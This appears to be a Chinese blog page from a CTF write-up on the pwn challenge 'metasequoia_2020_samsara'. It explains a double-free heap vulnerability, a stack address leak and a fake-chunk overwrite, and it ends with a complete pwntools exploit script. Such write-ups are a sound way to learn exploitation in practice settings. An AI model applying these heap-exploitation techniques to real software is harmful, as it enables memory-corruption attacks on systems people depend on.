@@ -1,0 +1,252 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<title>metasequoia_2020_samsara [ your blog title ]</title>
+	
+	
+	<!-- stylesheets list from _config.yml -->
+	
+	<link rel="stylesheet" href="/css/PreciousJoy.css">
+	
+	<link rel="stylesheet" href="/css/top-bar.css">
+	
+	<link rel="stylesheet" href="/css/menu-outer.css">
+	
+	<link rel="stylesheet" href="/css/content-outer.css">
+	
+	<link rel="stylesheet" href="/css/bottom-outer.css">
+	
+	<link rel="stylesheet" href="/css/atom-one-dark.css">
+	
+	<link rel="stylesheet" href="/css/recent-posts-item.css">
+	
+	<link rel="stylesheet" href="/css/article-sidebar-toc.css">
+	
+	<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+	
+	<link rel="stylesheet" href="/css/search.css">
+	
+	<link rel="stylesheet" href="/css/toc.css">
+	
+	<link rel="stylesheet" href="/css/sidebar.css">
+	
+	<link rel="stylesheet" href="/css/archive.css">
+	
+	<link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
+	
+	<link rel="stylesheet" href="/css/Z-last-cover-others.css">
+	
+	
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+
+<body id="wrapper">
+
+	<div id="">
+		
+		<div id="top-bar">
+			
+			<div id="avatar-box">
+				<img 
+				class="avatar"
+				src="/images/default-avatar.jpg" 
+				alt="avatar">
+			</div>
+
+			<div id="top-bar-text">
+				<div id="top-bar-title">
+					pa1n
+				</div>
+				<div id="top-bar-slogan">
+					
+				</div>
+			</div>
+
+		</div>
+
+		<div id="menu-outer">
+			<div id="menu-inner">
+				
+				
+				<div class="menu-item">
+					<a href="/">Home</a>
+				</div>
+				
+				<div class="menu-item">
+					<a href="/about">About</a>
+				</div>
+				
+				<div class="menu-item">
+					<a href="/archives">Archives</a>
+				</div>
+				
+
+				<div class="menu-item menu-item-search">
+					
+  <span class="local-search local-search-google local-search-plugin">
+      <input type="search" placeholder="站内搜索" id="local-search-input" class="local-search-input-cls" style="">
+      <div id="local-search-result" class="local-search-result-cls"></div>
+  </span>
+	
+				</div>
+
+			</div>
+		</div>
+
+		<div id="content-outer">
+			<div id="content-inner">
+
+				
+<div id="details">
+	
+	<article id="details-post">
+		<div id=details-post-item>
+			<h1>metasequoia_2020_samsara</h1>
+			<h5 id="保护全开，就不放了"><a href="#保护全开，就不放了" class="headerlink" title="保护全开，就不放了"></a>保护全开，就不放了</h5><h5 id="程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag"><a href="#程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag" class="headerlink" title="程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag"></a>程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag</h5><p><img src="https://i.imgs.ovh/2023/12/03/wSene.png" alt=""></p>
+<h5 id="先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef"><a href="#先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef" class="headerlink" title="先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef"></a>先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef</h5><p><img src="https://i.imgs.ovh/2023/12/03/wukUH.png" alt="image-20231203164238201"></p>
+<p><img src="https://i.imgs.ovh/2023/12/03/wu1MT.png" alt="image-20231203165112607"></p>
+<h5 id="开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意"><a href="#开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意" class="headerlink" title="开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意"></a>开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node4.buuoj.cn&quot;,28766)
+p=process(&quot;./metasequoia_2020_samsara&quot;)
+context.log_level=&quot;debug&quot;
+
+libc=ELF(&#39;./libc-2.23.so&#39;)
+
+def add():
+    p.sendlineafter(&#39;choice &gt; &#39;,&#39;1&#39;)
+
+def free(index):
+    p.sendlineafter(&#39;choice &gt; &#39;,&#39;2&#39;)
+    p.sendlineafter(&#39;Index&#39;,str(index))
+
+def full(index,content):
+    p.sendlineafter(&#39;choice &gt; &#39;,&#39;3&#39;)
+    p.sendlineafter(&#39;Index&#39;,str(index))
+    p.sendlineafter(&#39;Ingredient:&#39;,content)
+
+def show():
+    p.sendlineafter(&#39;choice &gt; &#39;,&#39;4&#39;)
+
+def move(content):
+    p.sendlineafter(&#39;choice &gt; &#39;,&#39;5&#39;)
+    p.sendlineafter(&#39;Which kingdom?&#39;,content)
+
+add() #0
+add() #1
+add() #2
+free(0)
+free(1)
+free(0)
+show()
+
+p.recvuntil(&#39;Your lair is at: &#39;)
+addr=int(p.recv(14),16)
+#addr = int(p.recvuntil(&#39;\n&#39;, drop=True), 16)
+print(&#39;addr=&gt;&#39;+hex(addr))
+move(str(0x20))
+gdb.attach(p)
+pause()
+#sleep(1)
+
+
+v8=addr-0x8
+add() #3
+full(3,str(v8))
+add() #4
+add() #5
+
+add() #6
+
+full(6,str(0xdeadbeef))
+
+p.sendlineafter(&#39;choice &gt; &#39;,&#39;6&#39;)
+
+p.interactive()
+</code></pre>
+
+		</div>
+
+		<!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC80NjIyNC8yMjczNQ==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+		
+	</article>
+
+	<div id="toc">
+		
+	</div>
+
+</div>
+
+<!-- <div id="paginator"> -->
+<!-- 	 -->
+<!-- </div> -->
+
+
+			</div>
+		</div>
+
+		<div id="bottom-outer">
+			<div id="bottom-inner">
+				Site by your name | 
+				Powered by <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> |
+				theme <a target="_blank" rel="noopener" href="https://github.com/fireworks99/hexo-theme-PreciousJoy">PreciousJoy</a>
+			</div>
+		</div>
+
+		
+	</div>
+
+
+
+
+
+	
+	<!-- scripts list from theme config.yml -->
+	
+	<script src="/js/jquery-3.5.1.min.js"></script>
+	
+	<script src="/js/PreciousJoy.js"></script>
+	
+	<script src="/js/highlight.pack.js"></script>
+	
+	<script src="/js/jquery.fancybox.min.js"></script>
+	
+	<script src="/js/search.js"></script>
+	
+	<script src="/js/load.js"></script>
+	
+	<script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
+	
+	<script src="/js/clipboard.min.js"></script>
+	
+	
+
+	<script>hljs.initHighlightingOnLoad();</script>
+
+</body>
+</html>
